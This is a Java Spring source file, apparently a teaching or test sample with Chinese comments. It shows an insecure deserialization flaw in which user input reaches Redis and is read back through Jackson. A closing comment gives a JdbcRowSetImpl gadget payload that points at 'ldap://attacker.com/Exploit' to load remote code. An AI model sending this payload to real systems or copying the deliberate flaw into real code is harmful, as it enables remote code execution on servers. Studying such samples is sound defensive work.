package com.example.vulnerableapp;

import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Service;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.util.Map;

@Service
public class VulnerableCacheService {
    private final RedisTemplate<String, Object> redisTemplate;
    private final ObjectMapper objectMapper;

    public VulnerableCacheService(RedisTemplate<String, Object> redisTemplate, ObjectMapper objectMapper) {
        this.redisTemplate = redisTemplate;
        this.objectMapper = objectMapper;
    }

    @SuppressWarnings("unchecked")
    public Map<String, Object> getCacheDynamicDataSourceModel(String cacheKey) {
        // 不安全的反序列化操作
        Object cached = redisTemplate.opsForValue().get(cacheKey);
        if (cached instanceof String) {
            try {
                // 错误地将JSON字符串反序列化为Map，可能触发多态反序列化
                return objectMapper.readValue((String) cached, Map.class);
            } catch (Exception e) {
                // 忽略异常处理
            }
        }
        return (Map<String, Object>) cached;
    }

    public void updateRoleDependency(String roleKey, Map<String, Object> roleConfig) {
        // 直接存储用户输入到Redis，可能包含恶意序列化数据
        redisTemplate.opsForHash().put("role:dependencies", roleKey, roleConfig.get("role-dependencies"));
    }
}

// Controller层示例
@RestController
@RequestMapping("/api/roles")
class RoleController {
    private final VulnerableCacheService cacheService;

    public RoleController(VulnerableCacheService cacheService) {
        this.cacheService = cacheService;
    }

    @PostMapping("/batchSetStatus")
    public ResponseEntity<String> batchSetRoleStatus(@RequestBody Map<String, Object> payload) {
        // 用户输入直接进入Redis存储流程
        cacheService.updateRoleDependency(
            payload.get("roleName").toString(),
            (Map<String, Object>) payload.get("config")
        );
        return ResponseEntity.ok("Updated");
    }
}

// 漏洞利用载体示例
record RoleDependency(String role, String type, String[] dependencies) {}
// 可构造如下JSON注入：
// {
//   "@type": "com.sun.rowset.JdbcRowSetImpl",
//   "dataSourceName": "ldap://attacker.com/Exploit",
//   "autoCommit": true
// }